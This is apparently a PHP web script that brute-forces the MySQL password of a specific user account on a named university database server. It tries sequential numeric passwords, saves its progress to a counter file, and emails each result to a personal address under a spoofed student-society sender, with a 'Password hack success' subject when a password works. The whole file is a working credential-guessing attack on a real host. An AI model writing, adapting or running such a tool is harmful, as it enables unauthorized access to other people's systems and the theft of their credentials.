<html>
<body>
<?php

$myFile = "counter.txt";
$fhandle = fopen($myFile, 'w');
$file = file_get_contents('counter.txt', true);
$pass = $file ;

echo "starting at ". $pass;
flush();
ob_flush();
$con = false;
$time = microtime();
$user = "rbbc526";
$max =  $pass + 10000;
while(!$con && ($pass<=$max)){

	 $pass++;

	 if(($pass%$_GET["repeat"])==0){
		echo $pass . "<br/>\r\n";
		flush(); //toilet
		ob_flush();
	}

	 $con = mysql_connect("lamp2010.soi.city.ac.uk", $user, $pass);

}
echo $pass ;
fwrite($fhandle,$pass);
fclose($fhandle);

if(!$con) {
	echo " last I tried<br/>";
	email($pass . " last I tried ");
	}
else {
	echo " <span style='color:green'>worked!!! </span><br/>";
	email($pass . " this is the one that worked ", true);
     }
list($ousec, $osec) = explode(" ", $time);
list($usec, $sec) = explode(" ", microtime());
echo $sec-$osec . ":".(abs($usec-$ousec))*1000 . " time taken";


function email($message,$worked = false){
	$to      = 'ijtabahussain@live.com';
	if($worked) $subject = 'CompSocks Password hack success!!!';
	else $subject = 'dbsectest attempt';
	$message = $message;
	$headers = 'From: computingsoc@city.ac.uk' . "\r\n" .
	    'Reply-To:  computingsoc@city.ac.uk' . "\r\n" .
	    'X-Mailer: PHP/' . phpversion();

	mail($to, $subject, $message, $headers);
}
?>
</body>
</html>
